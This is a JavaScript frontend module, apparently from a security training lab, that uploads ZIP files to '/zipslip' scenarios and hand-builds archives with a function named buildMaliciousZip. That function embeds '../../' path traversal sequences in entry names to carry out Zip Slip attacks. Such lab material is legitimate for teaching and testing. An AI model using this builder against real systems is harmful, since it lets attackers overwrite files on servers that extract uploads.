import request from '@/utils/request'

export function uploadZip(scene, file) {
  const formData = new FormData()
  formData.append('file', file)
  return request({
    url: `/zipslip/${scene}`,
    method: 'post',
    data: formData,
    headers: { 'Content-Type': 'multipart/form-data' },
    timeout: 30000
  })
}

/**
 * 纯 JavaScript 构造 ZIP 文件（不依赖第三方库）
 * 支持在条目名中嵌入 ../../ 路径穿越序列
 */
export function buildMaliciousZip(entryName, content) {
  const encoder = new TextEncoder()
  const fileData = encoder.encode(content)
  const fileNameData = encoder.encode(entryName)

  const crc = crc32(fileData)
  const now = new Date()
  const dosTime = dateToDos(now)

  // Local file header (30 + fileNameLen + fileDataLen)
  const localHeader = new Uint8Array(30 + fileNameData.length)
  const lhView = new DataView(localHeader.buffer)
  lhView.setUint32(0, 0x04034b50, true) // signature
  lhView.setUint16(4, 20, true) // version needed
  lhView.setUint16(6, 0, true) // flags
  lhView.setUint16(8, 0, true) // compression: stored
  lhView.setUint16(10, dosTime.time, true)
  lhView.setUint16(12, dosTime.date, true)
  lhView.setUint32(14, crc, true)
  lhView.setUint32(18, fileData.length, true) // compressed size
  lhView.setUint32(22, fileData.length, true) // uncompressed size
  lhView.setUint16(26, fileNameData.length, true)
  lhView.setUint16(28, 0, true) // extra field length
  localHeader.set(fileNameData, 30)

  // Central directory header (46 + fileNameLen)
  const centralDir = new Uint8Array(46 + fileNameData.length)
  const cdView = new DataView(centralDir.buffer)
  cdView.setUint32(0, 0x02014b50, true) // signature
  cdView.setUint16(4, 20, true) // version made by
  cdView.setUint16(6, 20, true) // version needed
  cdView.setUint16(8, 0, true) // flags
  cdView.setUint16(10, 0, true) // compression
  cdView.setUint16(12, dosTime.time, true)
  cdView.setUint16(14, dosTime.date, true)
  cdView.setUint32(16, crc, true)
  cdView.setUint32(20, fileData.length, true)
  cdView.setUint32(24, fileData.length, true)
  cdView.setUint16(28, fileNameData.length, true)
  cdView.setUint16(30, 0, true) // extra field length
  cdView.setUint16(32, 0, true) // comment length
  cdView.setUint16(34, 0, true) // disk number start
  cdView.setUint16(36, 0, true) // internal attrs
  cdView.setUint32(38, 0, true) // external attrs
  cdView.setUint32(42, 0, true) // local header offset

  const localFileOffset = localHeader.length + fileData.length

  // End of central directory (22 bytes)
  const eocd = new Uint8Array(22)
  const eocdView = new DataView(eocd.buffer)
  eocdView.setUint32(0, 0x06054b50, true) // signature
  eocdView.setUint16(4, 0, true) // disk number
  eocdView.setUint16(6, 0, true) // disk with central dir
  eocdView.setUint16(8, 1, true) // entries on this disk
  eocdView.setUint16(10, 1, true) // total entries
  eocdView.setUint32(12, centralDir.length, true) // central dir size
  eocdView.setUint32(16, localFileOffset, true) // central dir offset
  eocdView.setUint16(20, 0, true) // comment length

  const blob = new Blob([localHeader, fileData, centralDir, eocd], { type: 'application/zip' })
  return new File([blob], 'malicious.zip', { type: 'application/zip' })
}

export function buildNormalZip(entryName, content) {
  return buildMaliciousZip(entryName, content)
}

function dateToDos(date) {
  return {
    time: ((date.getHours() << 11) | (date.getMinutes() << 5) | (date.getSeconds() >> 1)) & 0xFFFF,
    date: (((date.getFullYear() - 1980) << 9) | ((date.getMonth() + 1) << 5) | date.getDate()) & 0xFFFF
  }
}

function crc32(data) {
  let crc = 0xFFFFFFFF
  for (let i = 0; i < data.length; i++) {
    crc ^= data[i]
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0)
    }
  }
  return (crc ^ 0xFFFFFFFF) >>> 0
}
